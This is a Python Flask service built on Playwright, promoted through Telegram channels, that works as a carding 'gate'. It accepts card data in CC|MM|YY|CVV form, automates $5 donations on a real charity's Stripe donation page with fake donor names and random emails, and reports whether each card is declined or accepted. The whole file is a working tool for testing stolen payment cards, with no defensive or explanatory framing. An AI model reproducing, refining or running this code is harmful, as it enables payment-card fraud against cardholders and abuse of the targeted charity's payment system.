#t.me/npnbit
#https://t.me/+Lyrg9tujMsEwOTU9
from flask import Flask, request, jsonify
from playwright.sync_api import sync_playwright
import time
import json
import re
import random

app = Flask(__name__)

def check_card(cc, mes, ano, cvv):
    start = time.time()
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=['--no-sandbox'])
        context = browser.new_context(
            viewport={'width': 1280, 'height': 800},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = context.new_page()
        
        stripe_confirm_response = None
        stripe_error_response = None
        
        def on_response(response):
            nonlocal stripe_confirm_response, stripe_error_response
            
            # Capture  responses
            if 'api.stripe.com' in response.url and response.request.method == 'POST':
                try:
                    body = response.json()
                    
                    # Print FULL response for debugging
                    print(f"\n[STRIPE RESPONSE] {response.status} {response.url}")
                    print(json.dumps(body, indent=2))
                    print("-" * 60)
                    
                    # Check for error in response
                    if 'error' in body:
                        stripe_error_response = body
                        print(f"[STRIPE ERROR FULL]: {json.dumps(body, indent=2)}")
                    
                    # Check for payment intent confirm
                    if 'payment_intents' in response.url and '/confirm' in response.url:
                        stripe_confirm_response = body
                    
                    # Check for charges
                    if '/charges' in response.url:
                        stripe_confirm_response = body
                        
                except Exception as e:
                    pass
        
        page.on('response', on_response)
        
        try:
            # Go to donation page
            page.goto("https://www.brightercommunities.org/donate-form/?form-id=1938&payment-mode=stripe&level-id=custom&custom-amount=5", timeout=60000)
            page.wait_for_timeout(5000)
            
            # Accept cookies
            try:
                page.click('#wt-cli-accept-all-btn, #wt-cli-accept-btn, .cli_action_button', timeout=3000)
                page.wait_for_timeout(2000)
            except:
                pass
            
            # Fill personal details
            email = f"donor{random.randint(10000,99999)}@gmail.com"
            page.fill('input[name="give_first"]', "npnbit")
            page.fill('input[name="give_last"]', "Xd")
            page.fill('input[name="give_email"]', email)
            page.fill('input[name="card_name"]', "npnbit Xd")
            
            # Fill card
            page.wait_for_timeout(3000)
            
            for frame in page.frames:
                try:
                    for sel in ['input[name="cardnumber"]', 'input[name="cardNumber"]']:
                        card_input = frame.locator(sel).first
                        if card_input.is_visible():
                            card_input.fill(cc)
                            print(f"Card: {cc[:6]}...{cc[-4:]}")
                            break
                    
                    for sel in ['input[name="exp-date"]', 'input[name="expDate"]']:
                        exp_input = frame.locator(sel).first
                        if exp_input.is_visible():
                            exp_input.fill(f"{mes.zfill(2)}{ano[-2:]}")
                            print(f"Expiry: {mes}/{ano}")
                            break
                    
                    for sel in ['input[name="cvc"]', 'input[name="cvv"]']:
                        cvc_input = frame.locator(sel).first
                        if cvc_input.is_visible():
                            cvc_input.fill(cvv)
                            print("CVC: ***")
                            break
                except:
                    pass
            
            # Click Donate
            page.wait_for_timeout(1000)
            page.click('#give-purchase-button, button[type="submit"], .give-submit-button')
            print("Clicked donate")
            
            # Wait for response
            for _ in range(30):
                if stripe_confirm_response or stripe_error_response:
                    break
                page.wait_for_timeout(1000)
            
            # Return response
            if stripe_error_response:
                return {
                    "status": "declined",
                    "raw_response": stripe_error_response,
                    "error": stripe_error_response.get('error', {}),
                    "time": f"{time.time()-start:.2f}s"
                }
            elif stripe_confirm_response:
                return {
                    "status": "raw",
                    "raw_response": stripe_confirm_response,
                    "time": f"{time.time()-start:.2f}s"
                }
            else:
                page_content = page.content()
                error_match = re.search(r'<strong>Error</strong>:\s*([^<]+)', page_content)
                if error_match:
                    return {
                        "status": "error",
                        "raw_response": error_match.group(1),
                        "time": f"{time.time()-start:.2f}s"
                    }
                
                return {
                    "status": "no_response",
                    "page_snippet": page_content[:500],
                    "time": f"{time.time()-start:.2f}s"
                }
                
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)[:200],
                "time": f"{time.time()-start:.2f}s"
            }
        finally:
            browser.close()

@app.route('/stripe5', methods=['GET'])
def stripe5():
    cc = request.args.get('cc', '')
    if not cc:
        return jsonify({"error": "No card"})
    parts = cc.replace('%7C', '|').split('|')
    if len(parts) < 4:
        return jsonify({"error": "Format: CC|MM|YY|CVV"})
    return jsonify(check_card(parts[0], parts[1], parts[2], parts[3]))

@app.route('/')
def index():
    return jsonify({
        "status": "ONLINE",
        "gate": "Stripe 5$",
        "endpoint": "/stripe5?cc=CC|MM|YY|CVV"
    })

if __name__ == '__main__':
    print("Stripe  running on :8087")
    app.run(host='0.0.0.0', port=8087, debug=False)

#t.me/npnbit4